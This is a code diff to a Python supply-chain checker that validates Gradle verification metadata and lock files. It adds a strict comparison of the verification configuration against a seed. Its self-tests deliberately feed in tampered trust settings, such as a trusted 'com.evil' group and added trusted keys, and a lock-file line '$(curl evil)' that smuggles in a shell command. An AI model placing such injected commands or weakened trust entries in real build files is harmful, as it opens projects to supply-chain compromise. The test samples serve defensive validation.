@@ -5,7 +5,8 @@
               signatures, sources/javadoc jars trusted for the IDE); Gradle adds the sha256 entries.
 --check DIR   strict check of the handed-over artifact before the publish job commits it: only the expected file
               names (paths relative to android/), regular files, size limits, verification metadata is well-formed
-              XML with the expected root, lock files contain only lock lines. Normalises CRLF to LF in place.
+              XML with the expected root and exactly the <configuration> of the seed (verify metadata on, the same
+              trusted artifacts, no trusted or ignored keys), lock files contain only lock lines. Normalises CRLF to LF in place.
               Exit 1 with an annotation on the first problem. Nothing from the artifact is executed.
 
 Usage: python3 -I supply_chain_files.py --seed FILE | --check DIR | --self-test
@@ -44,6 +45,28 @@ SEED = """<?xml version="1.0" encoding="UTF-8"?>
 
 class Invalid(Exception):
     pass
+
+
+def canonical(element):
+    """Element als vergleichbares Tupel: Name, Attribute sortiert, Text ohne Leerraum, Kinder in Reihenfolge."""
+    return (element.tag, tuple(sorted(element.attrib.items())), (element.text or "").strip(),
+            tuple(canonical(child) for child in element))
+
+
+def seed_configuration():
+    return canonical(ET.fromstring(SEED.encode("utf-8")).find(NS + "configuration"))
+
+
+def check_configuration(rel, root):
+    # Nur die Konfiguration des SEED: keine abgeschaltete Prüfung, keine zusätzlichen vertrauten Dateien oder Schlüssel
+    configs = root.findall(NS + "configuration")
+    if len(configs) != 1:
+        raise Invalid(f"{rel}: expected exactly one <configuration>")
+    verify = configs[0].find(NS + "verify-metadata")
+    if verify is None or (verify.text or "").strip() != "true":
+        raise Invalid(f"{rel}: verify-metadata must be true")
+    if canonical(configs[0]) != seed_configuration():
+        raise Invalid(f"{rel}: <configuration> differs from the seed (trusted artifacts or keys changed)")
 
 
 def seed(path):
@@ -95,6 +118,7 @@ def check(directory):
                 raise Invalid(f"{rel}: not well-formed XML ({exc})")
             if root.tag != NS + "verification-metadata":
                 raise Invalid(f"{rel}: unexpected root element {root.tag}")
+            check_configuration(rel, root)
             components = root.find(NS + "components")
             if components is None or len(components) == 0:
                 raise Invalid(f"{rel}: no components (Gradle wrote no checksums)")
@@ -136,6 +160,33 @@ def self_test():
         except Invalid as exc:
             assert "unexpected file" in str(exc), exc
         os.remove(os.path.join(tmp, "app/build.gradle.kts"))
+        good = SEED.replace("<components>", '<components><component group="a" name="b" version="1"/>')
+        # Gleiche Konfiguration mit anderem Leerraum und anderer Attributreihenfolge bleibt gültig
+        same = good.replace('<trust file=".*-javadoc[.]jar" regex="true"', '<trust   regex="true" file=".*-javadoc[.]jar"')
+        configuration_cases = [
+            (same, None),
+            (good.replace("<verify-metadata>true", "<verify-metadata>false"), "verify-metadata must be true"),
+            (good.replace("   <configuration>\n      <verify-metadata>true</verify-metadata>\n", "   <configuration>\n"),
+             "verify-metadata must be true"),
+            (good.replace("</trusted-artifacts>", '<trust group="com.evil"/></trusted-artifacts>'), "differs from the seed"),
+            (good.replace(".*-sources[.]jar", ".*"), "differs from the seed"),
+            (good.replace("</configuration>", '<trusted-keys><trusted-key id="ABCD" group="x"/></trusted-keys>'
+                          "</configuration>"), "differs from the seed"),
+            (good.replace("</configuration>", '<ignored-keys><ignored-key id="ABCD"/></ignored-keys></configuration>'),
+             "differs from the seed"),
+            (good.replace("<verify-signatures>false", "<verify-signatures>true"), "differs from the seed"),
+            (good.replace("<components>", "<configuration/><components>"), "exactly one <configuration>"),
+        ]
+        for xml, expected in configuration_cases:
+            with open(os.path.join(tmp, METADATA), "w", encoding="utf-8") as f:
+                f.write(xml)
+            try:
+                check(tmp)
+                assert expected is None, f"configuration must be rejected: {expected}"
+            except Invalid as exc:
+                assert expected is not None and expected in str(exc), exc
+        with open(os.path.join(tmp, METADATA), "w", encoding="utf-8") as f:
+            f.write(good)
         with open(os.path.join(tmp, "marketdata/gradle.lockfile"), "a", encoding="utf-8") as f:
             f.write("$(curl evil)\n")
         try:
